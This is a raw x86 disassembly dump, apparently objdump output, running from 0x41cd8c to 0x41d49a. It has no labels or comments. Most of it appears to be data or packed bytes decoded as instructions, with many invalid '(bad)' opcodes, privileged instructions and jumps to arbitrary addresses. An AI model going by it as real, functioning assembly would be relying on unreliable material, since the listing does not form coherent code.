  41cd8c:	adc    DWORD PTR [ecx],edi
  41cd8e:	mov    ebp,0x8956203d
  41cd93:	aad    0xa8
  41cd95:	sub    al,0x85
  41cd97:	in     al,dx
  41cd98:	cmp    dh,ch
  41cd9a:	push   0x2db022eb
  41cd9f:	push   ds
  41cda0:	inc    ebp
  41cda1:	cs or  ecx,ebx
  41cda4:	pop    ecx
  41cda5:	dec    ecx
  41cda6:	pop    eax
  41cda7:	fld    TBYTE PTR [eax-0x6370d842]
  41cdad:	mov    bh,0xf2
  41cdaf:	jb     0x41ce1d
  41cdb1:	jmp    0x41ce04
  41cdb3:	call   0xf5d8cee2
  41cdb8:	jmp    0x41cd48
  41cdba:	push   0xffffffb6
  41cdbc:	xlat   BYTE PTR ds:[ebx]
  41cdbd:	inc    esi
  41cdbe:	fisttp WORD PTR [ebx+0x7b47f81]
  41cdc4:	adc    BYTE PTR [edx+0x5a],0x51
  41cdc8:	dec    ebp
  41cdc9:	adc    esi,ecx
  41cdcb:	into   
  41cdcc:	shl    BYTE PTR [esi],cl
  41cdce:	dec    edi
  41cdcf:	fs pop ecx
  41cdd1:	and    eax,0xd9e095d5
  41cdd6:	add    al,0xf
  41cdd8:	dec    ebp
  41cdd9:	dec    edx
  41cdda:	pop    esp
  41cddb:	loop   0x41cd6e
  41cddd:	iret   
  41cdde:	fstp   QWORD PTR [esi]
  41cde0:	inc    eax
  41cde1:	sar    DWORD PTR [esi+0x4d],0x6e
  41cde5:	jge    0x41cd98
  41cde7:	popa   
  41cde8:	lock fs adc al,0xd
  41cdec:	mov    ah,0x18
  41cdee:	sub    BYTE PTR [ebp+0x7d],cl
  41cdf1:	dec    esp
  41cdf2:	push   eax
  41cdf3:	push   eax
  41cdf4:	lods   al,BYTE PTR ds:[esi]
  41cdf5:	xor    al,0xdd
  41cdf7:	jae    0x41cda1
  41cdf9:	push   esp
  41cdfa:	pop    eax
  41cdfb:	pop    eax
  41cdfc:	imul   ebx,DWORD PTR [eax+0x171054d5],0x23
  41ce03:	adc    DWORD PTR [ecx],ecx
  41ce05:	adc    BYTE PTR ds:0x68521401,al
  41ce0b:	enter  0x3a37,0xcf
  41ce0f:	jae    0x41cdf5
  41ce11:	mov    edi,0x96d8e01e
  41ce16:	inc    esi
  41ce17:	nop
  41ce18:	in     al,0x18
  41ce1a:	hlt    
  41ce1b:	popf   
  41ce1c:	scas   al,BYTE PTR es:[edi]
  41ce1d:	jmp    0x65a:0x37e035f2
  41ce24:	sbb    eax,0x90ddd973
  41ce29:	fild   DWORD PTR [edi-0x3a]
  41ce2c:	adc    ebp,edi
  41ce2e:	pop    ds
  41ce2f:	push   ss
  41ce30:	or     dl,BYTE PTR [ebx+0x53]
  41ce33:	lahf   
  41ce34:	inc    ecx
  41ce35:	int    0x9c
  41ce37:	out    dx,eax
  41ce38:	mov    ds:0xa63ad9b2,eax
  41ce3d:	sbb    BYTE PTR [edx+0x7a],bh
  41ce40:	xchg   ecx,eax
  41ce41:	fmul   DWORD PTR [ebx+0x75eceacb]
  41ce47:	aad    0x5f
  41ce49:	cs nop
  41ce4b:	cli    
  41ce4c:	dec    ebx
  41ce4d:	inc    esi
  41ce4e:	mov    al,ds:0x9a521d6b
  41ce53:	pushf  
  41ce54:	jmp    0x3153:0xc6a26c74
  41ce5b:	mov    ebp,0x7d1810a
  41ce60:	js     0x41ce5b
  41ce62:	pop    ss
  41ce63:	test   DWORD PTR [edi+edi*4],edi
  41ce66:	mov    al,ds:0x940206b3
  41ce6b:	dec    dh
  41ce6d:	ret    0xb191
  41ce70:	and    DWORD PTR [edi],esi
  41ce72:	or     edi,DWORD PTR [edx+0x1b]
  41ce75:	psadbw mm0,mm2
  41ce78:	push   ebx
  41ce79:	mov    DWORD PTR [edx-0x6b],esp
  41ce7c:	mov    ?,esi
  41ce7e:	or     ecx,DWORD PTR [esi+0x19]
  41ce81:	(bad)  
  41ce82:	repz jbe 0x41cedd
  41ce85:	xchg   edi,eax
  41ce86:	xor    ebx,DWORD PTR [ebx-0x4f]
  41ce89:	jno    0x41ce28
  41ce8b:	cmc    
  41ce8c:	inc    edx
  41ce8d:	mov    BYTE PTR [edx-0x2f],al
  41ce90:	push   ss
  41ce91:	fwait
  41ce92:	repnz and eax,esi
  41ce95:	gs test eax,0xb441212b
  41ce9b:	or     ebx,ebp
  41ce9d:	inc    edx
  41ce9e:	leave  
  41ce9f:	ret    
  41cea0:	inc    edi
  41cea1:	add    BYTE PTR [edx],cl
  41cea3:	xchg   BYTE PTR [ebp-0xb9adb8c],al
  41cea9:	cld    
  41ceaa:	(bad)  
  41ceab:	dec    edx
  41ceac:	(bad)  
  41cead:	loope  0x41ced3
  41ceaf:	fisubr WORD PTR [edx]
  41ceb1:	cmp    edx,DWORD PTR [edi]
  41ceb3:	xchg   edi,eax
  41ceb4:	xchg   esi,eax
  41ceb5:	aaa    
  41ceb6:	cmp    eax,0xad970df8
  41cebb:	jle    0x41cf07
  41cebd:	sti    
  41cebe:	pop    ss
  41cebf:	icebp  
  41cec0:	stos   BYTE PTR es:[edi],al
  41cec1:	hlt    
  41cec2:	sbb    esp,DWORD PTR [esp+ebp*1+0x6d]
  41cec6:	in     eax,dx
  41cec7:	add    esi,DWORD PTR [eax]
  41cec9:	out    0x31,eax
  41cecb:	jge    0x41cf0b
  41cecd:	sahf   
  41cece:	in     eax,dx
  41cecf:	pop    ds
  41ced0:	loope  0x41ce90
  41ced2:	popa   
  41ced3:	in     eax,0x96
  41ced5:	jns    0x41cf3d
  41ced7:	jle    0x41ce81
  41ced9:	out    dx,al
  41ceda:	mov    edi,0x536af38d
  41cedf:	mov    ecx,0x51bebac
  41cee4:	adc    eax,0xd1cb0b8c
  41cee9:	(bad)  
  41ceea:	mov    edx,0x6a419d3d
  41ceef:	dec    ebx
  41cef0:	shl    BYTE PTR ss:[edi+0x5a],1
  41cef4:	lahf   
  41cef5:	test   BYTE PTR [edx-0x11876725],ah
  41cefb:	cmp    ch,bl
  41cefd:	or     DWORD PTR [eax+0x8],ecx
  41cf00:	push   eax
  41cf01:	stc    
  41cf02:	stc    
  41cf03:	sbb    eax,0x83c8133b
  41cf08:	scas   al,BYTE PTR es:[edi]
  41cf09:	cdq    
  41cf0a:	lahf   
  41cf0b:	ins    BYTE PTR es:[edi],dx
  41cf0c:	xchg   edi,eax
  41cf0d:	imul   ebx,eax,0x70669cf6
  41cf13:	jo     0x41cea1
  41cf15:	jo     0x41cf8b
  41cf17:	je     0x41cea1
  41cf19:	je     0x41cf93
  41cf1b:	js     0x41cea1
  41cf1d:	js     0x41cf9b
  41cf1f:	jl     0x41cea1
  41cf21:	jl     0x41cea3
  41cf23:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41cf28:	js     0x41ceae
  41cf2a:	mov    BYTE PTR [eax-0x7373778c],cl
  41cf30:	jo     0x41cebe
  41cf32:	nop
  41cf33:	nop
  41cf34:	ins    BYTE PTR es:[edi],dx
  41cf35:	nop
  41cf36:	xchg   esp,eax
  41cf37:	xchg   esp,eax
  41cf38:	push   0x64989894
  41cf3d:	cwde   
  41cf3e:	pushf  
  41cf3f:	pushf  
  41cf40:	pusha  
  41cf41:	pushf  
  41cf42:	mov    al,ds:0xa4a05ca0
  41cf47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf48:	pop    eax
  41cf49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf4a:	test   al,0xa8
  41cf4c:	push   esp
  41cf4d:	test   al,0xac
  41cf4f:	lods   al,BYTE PTR ds:[esi]
  41cf50:	push   eax
  41cf51:	lods   al,BYTE PTR ds:[esi]
  41cf52:	mov    al,0xb0
  41cf54:	dec    esp
  41cf55:	mov    al,0xb4
  41cf57:	mov    ah,0x48
  41cf59:	mov    ah,0xb8
  41cf5b:	mov    eax,0xbcbcb844
  41cf60:	inc    eax
  41cf61:	mov    esp,0xc03cc0c0
  41cf66:	(bad)  
  41cf67:	les    edi,FWORD PTR [eax]
  41cf69:	(bad)  
  41cf6a:	enter  0x34c8,0xc8
  41cf6e:	int3   
  41cf6f:	int3   
  41cf70:	xor    ah,cl
  41cf72:	rcl    al,1
  41cf74:	sub    al,0xd0
  41cf76:	aam    0xd4
  41cf78:	sub    ah,dl
  41cf7a:	fcomp  st(0)
  41cf7c:	and    al,0xd8
  41cf7e:	(bad)  
  41cf80:	and    ah,bl
  41cf82:	loopne 0x41cf64
  41cf84:	sbb    al,0xe0
  41cf86:	in     al,0xe4
  41cf88:	sbb    ah,ah
  41cf8a:	call   0xed29e477
  41cf8f:	in     al,dx
  41cf90:	adc    ah,ch
  41cf92:	lock lock or al,0xf0
  41cf96:	hlt    
  41cf97:	hlt    
  41cf98:	or     ah,dh
  41cf9a:	clc    
  41cf9b:	clc    
  41cf9c:	add    al,0xf8
  41cf9e:	cld    
  41cf9f:	cld    
  41cfa0:	add    ah,bh
  41cfa2:	add    BYTE PTR [eax],al
  41cfa4:	cld    
  41cfa5:	add    BYTE PTR [esp+eax*1],al
  41cfa8:	clc    
  41cfa9:	add    al,0x8
  41cfab:	or     ah,dh
  41cfad:	or     BYTE PTR [esp+ecx*1],cl
  41cfb0:	lock or al,0x10
  41cfb3:	adc    ah,ch
  41cfb5:	adc    BYTE PTR [esp+edx*1],dl
  41cfb8:	call   0xe459e7d1
  41cfbd:	sbb    BYTE PTR [esp+ebx*1],bl
  41cfc0:	loopne 0x41cfde
  41cfc2:	and    BYTE PTR [eax],ah
  41cfc4:	fsub   QWORD PTR [eax]
  41cfc6:	and    al,0x24
  41cfc8:	fsub   DWORD PTR [eax+ebp*1]
  41cfcb:	sub    ah,dl
  41cfcd:	sub    BYTE PTR [esp+ebp*1],ch
  41cfd0:	shr    BYTE PTR [eax+esi*1],1
  41cfd3:	xor    ah,cl
  41cfd5:	xor    BYTE PTR [esp+esi*1],dh
  41cfd8:	enter  0x3834,0x38
  41cfdc:	les    edi,FWORD PTR [eax]
  41cfde:	cmp    al,0x3c
  41cfe0:	sar    BYTE PTR [eax+eax*2],0x40
  41cfe4:	mov    esp,0xb8444440
  41cfe9:	inc    esp
  41cfea:	dec    eax
  41cfeb:	dec    eax
  41cfec:	mov    ah,0x48
  41cfee:	dec    esp
  41cfef:	dec    esp
  41cff0:	mov    al,0x4c
  41cff2:	push   eax
  41cff3:	push   eax
  41cff4:	lods   al,BYTE PTR ds:[esi]
  41cff5:	push   eax
  41cff6:	push   esp
  41cff7:	push   esp
  41cff8:	test   al,0x54
  41cffa:	pop    eax
  41cffb:	pop    eax
  41cffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cffd:	pop    eax
  41cffe:	pop    esp
  41cfff:	pop    esp
  41d000:	mov    al,ds:0x9c60605c
  41d005:	pusha  
  41d006:	fs fs cwde 
  41d009:	fs push 0x6c689468
  41d00f:	ins    BYTE PTR es:[edi],dx
  41d010:	nop
  41d011:	ins    BYTE PTR es:[edi],dx
  41d012:	jo     0x41d084
  41d014:	mov    WORD PTR [eax+0x74],?
  41d017:	je     0x41cfa1
  41d019:	je     0x41d093
  41d01b:	js     0x41cfa1
  41d01d:	js     0x41d09b
  41d01f:	jl     0x41cfa1
  41d021:	jl     0x41cfa3
  41d023:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41d028:	js     0x41cfae
  41d02a:	mov    BYTE PTR [eax-0x7373778c],cl
  41d030:	jo     0x41cfbe
  41d032:	nop
  41d033:	nop
  41d034:	ins    BYTE PTR es:[edi],dx
  41d035:	nop
  41d036:	xchg   esp,eax
  41d037:	xchg   esp,eax
  41d038:	push   0x64989894
  41d03d:	cwde   
  41d03e:	pushf  
  41d03f:	pushf  
  41d040:	pusha  
  41d041:	pushf  
  41d042:	mov    al,ds:0xa4a05ca0
  41d047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d048:	pop    eax
  41d049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d04a:	test   al,0xa8
  41d04c:	push   esp
  41d04d:	test   al,0xac
  41d04f:	lods   al,BYTE PTR ds:[esi]
  41d050:	push   eax
  41d051:	lods   al,BYTE PTR ds:[esi]
  41d052:	mov    al,0xb0
  41d054:	dec    esp
  41d055:	mov    al,0xb4
  41d057:	mov    ah,0x48
  41d059:	mov    ah,0xb8
  41d05b:	mov    eax,0xbcbcb844
  41d060:	inc    eax
  41d061:	mov    esp,0xc03cc0c0
  41d066:	(bad)  
  41d067:	les    edi,FWORD PTR [eax]
  41d069:	(bad)  
  41d06a:	enter  0x34c8,0xc8
  41d06e:	int3   
  41d06f:	int3   
  41d070:	xor    ah,cl
  41d072:	rcl    al,1
  41d074:	sub    al,0xd0
  41d076:	aam    0xd4
  41d078:	sub    ah,dl
  41d07a:	fcomp  st(0)
  41d07c:	and    al,0xd8
  41d07e:	(bad)  
  41d080:	and    ah,bl
  41d082:	loopne 0x41d064
  41d084:	sbb    al,0xe0
  41d086:	in     al,0xe4
  41d088:	sbb    ah,ah
  41d08a:	call   0xed29e577
  41d08f:	in     al,dx
  41d090:	adc    ah,ch
  41d092:	lock lock or al,0xf0
  41d096:	hlt    
  41d097:	hlt    
  41d098:	or     ah,dh
  41d09a:	clc    
  41d09b:	clc    
  41d09c:	add    al,0xf8
  41d09e:	cld    
  41d09f:	cld    
  41d0a0:	add    ah,bh
  41d0a2:	add    BYTE PTR [eax],al
  41d0a4:	cld    
  41d0a5:	add    BYTE PTR [esp+eax*1],al
  41d0a8:	clc    
  41d0a9:	add    al,0x8
  41d0ab:	or     ah,dh
  41d0ad:	or     BYTE PTR [esp+ecx*1],cl
  41d0b0:	push   cs
  41d0b1:	or     al,0x13
  41d0b3:	adc    ah,ch
  41d0b5:	adc    BYTE PTR [esp+edx*1],dh
  41d0b8:	call   0xe459e751
  41d0bd:	sbb    ah,bl
  41d0bf:	sbb    al,0xe0
  41d0c1:	pushf  
  41d0c2:	and    BYTE PTR [eax],ah
  41d0c4:	fsub   QWORD PTR [eax]
  41d0c6:	and    al,0x24
  41d0c8:	fsub   DWORD PTR [eax+ebp*1]
  41d0cb:	sub    ah,dl
  41d0cd:	sub    BYTE PTR [esp+ebp*1],ch
  41d0d0:	das    
  41d0d1:	sub    al,0x31
  41d0d3:	xor    ah,cl
  41d0d5:	xor    BYTE PTR [esp+esi*1-0x38],bh
  41d0d9:	mov    ah,0x3a
  41d0db:	cmp    ah,al
  41d0dd:	cmp    BYTE PTR [esp+edi*1-0x40],cl
  41d0e1:	mov    esp,0x40bc4043
  41d0e6:	fadd   QWORD PTR [eax+edi*4-0x3c]
  41d0ea:	dec    eax
  41d0eb:	dec    eax
  41d0ec:	mov    ah,0x48
  41d0ee:	dec    esp
  41d0ef:	dec    esp
  41d0f0:	mov    al,0x4c
  41d0f2:	push   eax
  41d0f3:	push   eax
  41d0f4:	lods   al,BYTE PTR ds:[esi]
  41d0f5:	push   eax
  41d0f6:	push   esp
  41d0f7:	push   esp
  41d0f8:	test   eax,0xa45c5154
  41d0fd:	pop    eax
  41d0fe:	cmp    al,0x5c
  41d100:	mov    al,ds:0x6353605c
  41d105:	pusha  
  41d106:	mov    WORD PTR [esi-0x68],fs
  41d109:	fs push 0x6c689468
  41d10f:	ins    BYTE PTR es:[edi],dx
  41d110:	nop
  41d111:	ins    BYTE PTR es:[edi],dx
  41d112:	jo     0x41d184
  41d114:	mov    WORD PTR [eax+0x74],?
  41d117:	je     0x41d0a1
  41d119:	je     0x41d193
  41d11b:	js     0x41d0a1
  41d11d:	js     0x41d19b
  41d11f:	jl     0x41d0a2
  41d121:	jl     0x41d0ac
  41d123:	test   BYTE PTR [eax+eax*4+0xc],bh
  41d127:	test   BYTE PTR [eax-0x7c],bh
  41d12a:	pusha  
  41d12b:	mov    ebp,0x8424888b
  41d130:	jo     0x41d0be
  41d132:	nop
  41d133:	nop
  41d134:	ins    BYTE PTR es:[edi],dx
  41d135:	nop
  41d136:	xchg   esp,eax
  41d137:	xchg   esp,eax
  41d138:	push   0x64989894
  41d13d:	cwde   
  41d13e:	pushf  
  41d13f:	pushf  
  41d140:	pusha  
  41d141:	pushf  
  41d142:	mov    al,ds:0xa4a05ca0
  41d147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d148:	pop    ecx
  41d149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d14a:	mov    eax,ds:0x1ca854ac
  41d14f:	lods   al,BYTE PTR ds:[esi]
  41d150:	push   eax
  41d151:	lods   al,BYTE PTR ds:[esi]
  41d152:	and    BYTE PTR [ebx+esi*4+0x48a41cb0],cl
  41d159:	mov    ah,0xb8
  41d15b:	mov    eax,0xbcbcb844
  41d160:	inc    eax
  41d161:	mov    esp,0xc03cc0c0
  41d166:	(bad)  
  41d167:	les    edi,FWORD PTR [eax]
  41d169:	(bad)  
  41d16a:	enter  0x34c8,0xc8
  41d16e:	int3   
  41d16f:	int3   
  41d170:	xor    esp,ecx
  41d172:	mov    ebx,0xcd02cd0
  41d177:	aam    0x28
  41d179:	push   esp
  41d17a:	fcomp  st(0)
  41d17c:	and    al,0xd8
  41d17e:	(bad)  
  41d180:	and    ah,bl
  41d182:	loopne 0x41d164
  41d184:	sbb    al,0xe0
  41d186:	in     al,0xe4
  41d188:	sbb    esp,esp
  41d18a:	loope  0x41d178
  41d18c:	adc    al,0xe8
  41d18e:	sbb    al,0xec
  41d190:	adc    ah,ch
  41d192:	enter  0xf3bf,0xf0
  41d196:	(bad)  
  41d197:	hlt    
  41d198:	or     ah,dh
  41d19a:	clc    
  41d19b:	clc    
  41d19c:	add    al,0xf8
  41d19e:	cld    
  41d19f:	cld    
  41d1a0:	add    ah,bh
  41d1a2:	sub    BYTE PTR [eax],al
  41d1a4:	cld    
  41d1a5:	add    BYTE PTR [esp+eax*1],ah
  41d1a8:	clc    
  41d1a9:	add    al,0x48
  41d1ab:	or     ah,dh
  41d1ad:	or     BYTE PTR ds:0x100c0c0c,cl
  41d1b3:	adc    ah,ch
  41d1b5:	adc    BYTE PTR [esi+edx*1],dl
  41d1b8:	call   0xe459e9d1
  41d1bd:	sbb    BYTE PTR [esp+ebx*1],bl
  41d1c0:	loopne 0x41d1de
  41d1c2:	and    BYTE PTR [eax],ah
  41d1c4:	fsub   QWORD PTR [eax]
  41d1c6:	and    al,0x24
  41d1c8:	fsub   DWORD PTR [eax+ebp*1]
  41d1cb:	sub    ah,dl
  41d1cd:	sub    BYTE PTR [esp+ebp*1],ch
  41d1d0:	push   eax
  41d1d1:	sub    al,0x30
  41d1d3:	mov    al,0xcc
  41d1d5:	xor    BYTE PTR [esp+esi*4],dh
  41d1d8:	dec    eax
  41d1d9:	xor    al,0xb8
  41d1db:	cmp    ah,al
  41d1dd:	cmp    BYTE PTR [esp+edi*1-0x3f3fc3c0],bh
  41d1e4:	mov    esp,0x38c4c440
  41d1e9:	inc    esp
  41d1ea:	mov    BYTE PTR [eax+0x4c4c48f4],cl
  41d1f0:	mov    bl,0x4c
  41d1f2:	push   eax
  41d1f3:	push   ecx
  41d1f4:	lods   al,BYTE PTR ds:[esi]
  41d1f5:	push   eax
  41d1f6:	push   esp
  41d1f7:	push   ebp
  41d1f8:	stos   DWORD PTR es:[edi],eax
  41d1f9:	push   esp
  41d1fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1fb:	pop    eax
  41d1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1fd:	pop    eax
  41d1fe:	mov    ds:0x9f5ca35c,eax
  41d203:	popa   
  41d204:	pushf  
  41d205:	pusha  
  41d206:	gs fwait
  41d208:	fwait
  41d209:	fs push 0x93699779
  41d20f:	ins    DWORD PTR es:[edi],dx
  41d210:	xchg   ebx,eax
  41d211:	ins    DWORD PTR es:[edi],dx
  41d212:	(bad)  
  41d213:	jno    0x41d1a4
  41d215:	jno    0x41d1a2
  41d217:	jne    0x41d1b1
  41d219:	je     0x41d293
  41d21b:	imul   eax,DWORD PTR [edi-0x7c827c87],0x7f817f7d
  41d225:	cmp    DWORD PTR [ebx-0x7b],0x99888468
  41d22c:	jg     0x41d21f
  41d22e:	sti    
  41d22f:	cmc    
  41d230:	sti    
  41d231:	cmc    
  41d232:	out    0xe9,eax
  41d234:	out    0xe9,eax
  41d236:	jecxz  0x41d24d
  41d238:	js     0x41d1ce
  41d23a:	cwde   
  41d23b:	mov    DWORD PTR [edi-0x1f],ebp
  41d23e:	jmp    0x41d225
  41d240:	jmp    0x41d227
  41d242:	xlat   BYTE PTR ds:[ebx]
  41d243:	(bad)  
  41d245:	(bad)  
  41d247:	and    eax,0xb9a8a448
  41d24c:	pop    edi
  41d24d:	rcr    ebx,1
  41d24f:	aad    0xdb
  41d251:	aad    0xc7
  41d253:	leave  
  41d254:	(bad)  
  41d255:	leave  
  41d256:	ret    
  41d257:	xor    eax,0xa9b8b458
  41d25c:	dec    edi
  41d25d:	rol    DWORD PTR [ebx-0x43],0x43
  41d261:	lds    esi,FWORD PTR [edi-0x4c3ec03f]
  41d267:	inc    ebp
  41d268:	sub    ah,al
  41d26a:	enter  0x3fd9,0xb1
  41d26e:	xor    ecx,ebp
  41d270:	xor    esi,DWORD PTR [ebp-0x2ed02e59]
  41d276:	mov    ds:0xd8d43855,eax
  41d27b:	leave  
  41d27c:	das    
  41d27d:	mov    eax,ds:0xa523dd23
  41d282:	xchg   edi,eax
  41d283:	loope  0x41d2a4
  41d285:	loope  0x41d21a
  41d287:	gs or  ah,ah
  41d28a:	call   0x13d2f288
  41d28f:	in     eax,dx
  41d290:	adc    edx,DWORD PTR [ebp-0xef00e79]
  41d296:	xor    DWORD PTR [ebp+0x18],0xfffffff4
  41d29a:	clc    
  41d29b:	jmp    0xfd4553af
  41d2a0:	add    eax,DWORD PTR [ebp+0x1ff0177]
  41d2a6:	jae    0x41d22d
  41d2a8:	call   0xff5adab1
  41d2ad:	jno    0x41d2a2
  41d2af:	or     eax,0x116775f3
  41d2b4:	out    dx,eax
  41d2b5:	adc    DWORD PTR [ebx-0x6b],esp
  41d2b8:	clc    
  41d2b9:	adc    al,0x18
  41d2bb:	or     edi,ebp
  41d2bd:	popa   
  41d2be:	imul   esp,DWORD PTR [ebp+0x6b],0x65
  41d2c2:	push   edi
  41d2c3:	pop    ecx
  41d2c4:	push   edi
  41d2c5:	pop    ecx
  41d2c6:	push   ebx
  41d2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2c8:	enter  0x2824,0x39
  41d2cc:	fist   WORD PTR [ecx+0x5b]
  41d2cf:	push   ebp
  41d2d0:	pop    ebx
  41d2d1:	push   ebp
  41d2d2:	inc    edi
  41d2d3:	dec    ecx
  41d2d4:	inc    edi
  41d2d5:	dec    ecx
  41d2d6:	inc    ebx
  41d2d7:	mov    ch,0xd8
  41d2d9:	xor    al,0x38
  41d2db:	sub    edi,ecx
  41d2dd:	inc    ecx
  41d2de:	dec    ebx
  41d2df:	inc    ebp
  41d2e0:	dec    ebx
  41d2e1:	inc    ebp
  41d2e2:	aaa    
  41d2e3:	cmp    DWORD PTR [edi],esi
  41d2e5:	cmp    DWORD PTR [ebx],esi
  41d2e7:	lds    ebp,FWORD PTR [eax-0x40a6b7bc]
  41d2ed:	xor    DWORD PTR [ebx+0x2735b34d],esi
  41d2f3:	push   ecx
  41d2f4:	scas   eax,DWORD PTR es:[edi]
  41d2f5:	push   ecx
  41d2f6:	and    edx,ebp
  41d2f8:	mov    eax,0xaf495854
  41d2fd:	and    DWORD PTR [ebx+0x1725a35d],esp
  41d303:	popa   
  41d304:	lahf   
  41d305:	popa   
  41d306:	adc    esp,ebp
  41d308:	mov    BYTE PTR [eax+ebp*2+0x79],ah
  41d30c:	lahf   
  41d30d:	adc    DWORD PTR [ebx+0x715936d],edx
  41d313:	jno    0x41d2a4
  41d315:	jno    0x41d31a
  41d317:	cmc    
  41d318:	cwde   
  41d319:	je     0x41d393
  41d31b:	imul   ecx,DWORD PTR [edi-0x7c827cff],0x7f81f705
  41d325:	xor    ebx,0x88846805
  41d32b:	cdq    
  41d32c:	jg     0x41d31f
  41d32e:	jae    0x41d2bd
  41d330:	jae    0x41d327
  41d332:	out    0x91,eax
  41d334:	outs   dx,DWORD PTR ds:[esi]
  41d335:	xchg   ecx,eax
  41d336:	jecxz  0x41d34d
  41d338:	js     0x41d2ce
  41d33a:	cwde   
  41d33b:	mov    DWORD PTR [edi-0x1f],ebp
  41d33e:	arpl   WORD PTR [ebp-0x5e281a9d],bx
  41d344:	pop    edi
  41d345:	mov    eax,ds:0xa44825d3
  41d34a:	test   al,0xb9
  41d34c:	pop    edi
  41d34d:	rcr    ebx,1
  41d34f:	aad    0xdb
  41d351:	aad    0xc7
  41d353:	leave  
  41d354:	(bad)  
  41d355:	leave  
  41d356:	ret    
  41d357:	xor    eax,0xa9b8b458
  41d35c:	dec    edi
  41d35d:	ror    ebx,0xc5
  41d360:	retf   
  41d361:	lds    esi,FWORD PTR [edi-0x4c464847]
  41d367:	inc    ebp
  41d368:	sub    ah,al
  41d36a:	enter  0x3fd9,0xb1
  41d36e:	mov    ebx,0xa7b5bbb5
  41d373:	test   eax,0x55a3a9a7
  41d378:	cmp    ah,dl
  41d37a:	fmul   st,st(1)
  41d37c:	daa    
  41d37d:	fldenv [eiz*4-0x66685a55]
  41d384:	xchg   edi,eax
  41d385:	jno    0x41d3a2
  41d387:	in     eax,0x8
  41d389:	in     al,0xe8
  41d38b:	stc    
  41d38c:	pop    ss
  41d38d:	jmp    0x95dd692d
  41d392:	xchg   DWORD PTR [ecx-0xaf47679],ecx
  41d398:	sbb    ah,dh
  41d39a:	clc    
  41d39b:	jmp    0x85cd44a7
  41d3a0:	mov    eax,DWORD PTR [ebp+0x79777977]
  41d3a6:	jl     0x41d3ad
  41d3a8:	call   0xff4adbb1
  41d3ad:	jno    0x41d42a
  41d3af:	jne    0x41d42c
  41d3b1:	je     0x41d34a
  41d3b3:	imul   esp,DWORD PTR [edi+0x69],0x14eb9563
  41d3ba:	pop    ss
  41d3bb:	sbb    esp,ebp
  41d3bd:	popa   
  41d3be:	imul   esp,DWORD PTR [ebp+0x6b],0xffffff9d
  41d3c2:	xlat   BYTE PTR ds:[ebx]
  41d3c3:	pop    ecx
  41d3c4:	push   edi
  41d3c5:	pop    ecx
  41d3c6:	push   ebx
  41d3c7:	mov    ch,0xdb
  41d3c9:	aam    0x28
  41d3cb:	cmp    edi,edx
  41d3cd:	sub    DWORD PTR [ebx+0x55],ebx
  41d3d0:	pop    ebx
  41d3d1:	sub    eax,0x494749cf
  41d3d6:	retf   
  41d3d7:	xor    eax,0x383834d8
  41d3dc:	aaa    
  41d3dd:	cmp    ebx,eax
  41d3df:	mov    ch,0x4b
  41d3e1:	cmp    eax,0x413439bf
  41d3e6:	mov    ebx,0x4844b8b4
  41d3eb:	dec    eax
  41d3ec:	mov    ah,0x48
  41d3ee:	mov    bl,0x4d
  41d3f0:	mov    bl,0xbc
  41d3f2:	pop    edi
  41d3f3:	push   ecx
  41d3f4:	scas   eax,DWORD PTR es:[edi]
  41d3f5:	push   ecx
  41d3f6:	push   esp
  41d3f7:	push   esp
  41d3f8:	test   al,0x54
  41d3fa:	pop    eax
  41d3fb:	pop    eax
  41d3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3fd:	pop    eax
  41d3fe:	pop    esp
  41d3ff:	dec    ebp
  41d400:	mov    ds:0x8c616fac,eax
  41d405:	pusha  
  41d406:	fs fs cwde 
  41d409:	mov    BYTE PTR fs:[eax-0x6c],ch
  41d40d:	popa   
  41d40e:	mov    WORD PTR [eax+edx*4+0x65],gs
  41d412:	nop
  41d413:	jo     0x41d3a1
  41d415:	jns    0x41d3ab
  41d417:	je     0x41d3a1
  41d419:	jge    0x41d3b3
  41d41b:	js     0x41d3a1
  41d41d:	jno    0x41d3bb
  41d41f:	jl     0x41d3a1
  41d421:	jne    0x41d483
  41d423:	cmp    BYTE PTR [ecx+ecx*4+0x64],0x84
  41d428:	js     0x41d3b7
  41d42a:	push   0x6c817488
  41d42f:	mov    WORD PTR [eax-0x7b],?
  41d432:	jo     0x41d3c4
  41d434:	ins    BYTE PTR es:[edi],dx
  41d435:	cdq    
  41d436:	je     0x41d3cc
  41d438:	push   0x6498789d
  41d43d:	xchg   ecx,eax
  41d43e:	jl     0x41d3dc
  41d440:	pusha  
  41d441:	xchg   ebp,eax
  41d442:	inc    eax
  41d443:	mov    al,ds:0xa444a95c
  41d448:	pop    eax
  41d449:	lods   eax,DWORD PTR ds:[esi]
  41d44a:	dec    eax
  41d44b:	test   al,0x54
  41d44d:	mov    eax,ds:0xa550ac4c
  41d452:	push   eax
  41d453:	mov    al,0x4c
  41d455:	mov    ecx,0xbd48b454
  41d45a:	pop    eax
  41d45b:	mov    eax,0xbc5cb144
  41d460:	inc    eax
  41d461:	mov    ch,0x20
  41d463:	sar    BYTE PTR [ecx+ecx*8],0x24
  41d467:	les    edi,FWORD PTR [eax]
  41d469:	int    0x28
  41d46b:	enter  0xc134,0x2c
  41d46f:	int3   
  41d470:	xor    ch,al
  41d472:	adc    al,dl
  41d474:	sub    al,0xd5
  41d476:	push   esp
  41d477:	aam    0x28
  41d479:	sar    DWORD PTR [eax],cl
  41d47b:	fsub   DWORD PTR [ecx+edx*8]
  41d47e:	and    al,0xdc
  41d480:	and    ch,bh
  41d482:	pop    ds
  41d483:	jecxz  0x41d421
  41d485:	loope  0x41d4a2
  41d487:	pop    es
  41d488:	arpl   bp,sp
  41d48a:	shr    al,0x14
  41d48d:	call   0xec52c15e
  41d492:	mov    al,0xf0
  41d494:	or     al,0xf0
  41d496:	cmc    
  41d497:	hlt    
  41d498:	lock hlt 
  41d49a:	clc    
